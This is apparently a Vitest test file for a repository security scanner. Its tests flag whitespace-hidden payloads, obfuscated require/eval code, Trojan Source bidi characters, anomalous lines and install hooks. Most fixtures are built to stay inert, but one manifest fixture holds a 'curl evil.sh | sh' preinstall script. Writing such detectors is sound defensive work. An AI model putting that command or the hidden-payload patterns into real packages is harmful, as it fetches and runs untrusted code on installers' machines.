import { describe, expect, it } from 'vitest'
import { scanContent, scanManifest } from './security-scan'

// Payload fragments are assembled at runtime rather than written literally, so
// this file stays inert even if the scanner's self-exclusion list ever changes.
const GLOBAL = 'global'
const REQ = 'require'

describe('hidden-payload — the detector that would have caught the incident', () => {
	it('flags code pushed off-screen behind padding whitespace', () => {
		const content = [
			'module.exports = {',
			'  darkMode: "class",',
			`};${' '.repeat(400)}${GLOBAL}['!']='8-3270-4';var x=1`,
		].join('\n')

		const findings = scanContent('tailwind.config.js', content)
		expect(findings).toHaveLength(1)
		expect(findings[0]).toMatchObject({ kind: 'hidden-payload', line: 3 })
		expect(findings[0].detail).toMatch(/columns of padding/)
	})

	it('does not flag ordinary deep indentation', () => {
		const content = ['function a() {', `${' '.repeat(100)}return 1`, '}'].join('\n')
		expect(scanContent('deep.ts', content)).toHaveLength(0)
	})

	it('does not flag aligned trailing comments', () => {
		const content = `const timeout = 30${' '.repeat(40)}// seconds`
		expect(scanContent('config.ts', content)).toHaveLength(0)
	})

	it('does not flag trailing whitespace with nothing after it', () => {
		const content = `const a = 1${' '.repeat(200)}`
		expect(scanContent('padded.ts', content)).toHaveLength(0)
	})
})

describe('obfuscated-payload', () => {
	it('flags require aliased onto a global', () => {
		const content = `${GLOBAL}[_$_1e42[0]]= ${REQ};`
		const findings = scanContent('evil.js', content)
		expect(findings[0]).toMatchObject({ kind: 'obfuscated-payload' })
		expect(findings[0].detail).toMatch(/require aliased/)
	})

	it('flags the char-shuffle deobfuscator shape', () => {
		const content =
			'var d=(function(l,e){var h=l.length;var g=[];for(var j=0;j<h;j++){g[j]=l.charAt(j)}})("ab",123)'
		expect(scanContent('evil.js', content)[0]).toMatchObject({ kind: 'obfuscated-payload' })
	})

	it('flags eval over base64', () => {
		const content = 'eval(atob("Y29uc29sZS5sb2coMSk="))'
		expect(scanContent('evil.js', content)[0]).toMatchObject({ kind: 'obfuscated-payload' })
	})

	it('leaves ordinary global access alone', () => {
		const content = 'const c = globalThis.crypto\nconst g = global.process\n'
		expect(scanContent('fine.ts', content)).toHaveLength(0)
	})
})

describe('bidi-control — Trojan Source', () => {
	// Built by code point rather than pasted: an invisible character in the
	// source would be unreviewable, which is the whole point of the attack.
	const RLO = String.fromCharCode(0x202e)
	const ZWSP = String.fromCharCode(0x200b)

	it('flags a right-to-left override', () => {
		const content = `const isAdmin = false // ${RLO} gnitset rof ylno`
		const findings = scanContent('trojan.ts', content)
		expect(findings[0]).toMatchObject({ kind: 'bidi-control' })
		expect(findings[0].detail).toMatch(/U\+202E/)
	})

	it('flags zero-width characters in code', () => {
		const content = `const admin${ZWSP} = true`
		expect(scanContent('zw.ts', content)[0]).toMatchObject({ kind: 'bidi-control' })
	})

	it('leaves accented and non-Latin text alone', () => {
		const content = `const mensaje = 'año — configuración'\nconst jp = 'こんにちは'\n`
		expect(scanContent('i18n.ts', content)).toHaveLength(0)
	})
})

describe('anomalous-line', () => {
	it('flags a long obfuscated-looking line in a source file', () => {
		const content = `var a=${'String.fromCharCode(65),'.repeat(120)}1`
		expect(scanContent('weird.ts', content)[0]).toMatchObject({ kind: 'anomalous-line' })
	})

	it('applies a tighter bound to config files', () => {
		const line = `var a=${'String.fromCharCode(65),'.repeat(30)}1`
		expect(scanContent('vite.config.ts', line)).toHaveLength(1)
		expect(scanContent('source.ts', line)).toHaveLength(0)
	})

	it('ignores minified and generated output', () => {
		const content = `var a=${'String.fromCharCode(65),'.repeat(120)}1`
		expect(scanContent('app.min.js', content)).toHaveLength(0)
		expect(scanContent('client.generated.ts', content)).toHaveLength(0)
	})

	it('ignores a long line with no obfuscation hint', () => {
		const content = `const text = '${'lorem ipsum dolor sit amet '.repeat(120)}'`
		expect(scanContent('copy.ts', content)).toHaveLength(0)
	})
})

describe('install-hook', () => {
	it('flags postinstall in a publishable package', () => {
		const manifest = JSON.stringify({
			name: '@elsium-ai/example',
			scripts: { build: 'tsc', postinstall: 'node ./setup.js' },
		})
		const findings = scanManifest('packages/example/package.json', manifest)
		expect(findings).toHaveLength(1)
		expect(findings[0]).toMatchObject({ kind: 'install-hook' })
		expect(findings[0].detail).toMatch(/postinstall/)
	})

	it('flags preinstall and install too', () => {
		const manifest = JSON.stringify({
			name: 'pkg',
			scripts: { preinstall: 'curl evil.sh | sh', install: 'node gyp' },
		})
		expect(scanManifest('packages/x/package.json', manifest)).toHaveLength(2)
	})

	it('allows lifecycle scripts in a private manifest', () => {
		const manifest = JSON.stringify({
			name: 'elsium-ai',
			private: true,
			scripts: { prepare: 'husky', postinstall: 'echo dev-only' },
		})
		expect(scanManifest('package.json', manifest)).toHaveLength(0)
	})

	it('allows a publishable package with only ordinary scripts', () => {
		const manifest = JSON.stringify({
			name: '@elsium-ai/core',
			scripts: { build: 'bun build ./src/index.ts', dev: 'bun --watch src/index.ts' },
		})
		expect(scanManifest('packages/core/package.json', manifest)).toHaveLength(0)
	})

	it('ignores an unparseable manifest rather than throwing', () => {
		expect(scanManifest('packages/x/package.json', '{not json')).toHaveLength(0)
	})
})

describe('clean input', () => {
	it('reports nothing for ordinary source', () => {
		const content = [
			"import { readFileSync } from 'node:fs'",
			'',
			'export function load(path: string): string {',
			"\treturn readFileSync(path, 'utf8')",
			'}',
		].join('\n')
		expect(scanContent('loader.ts', content)).toHaveLength(0)
	})
})
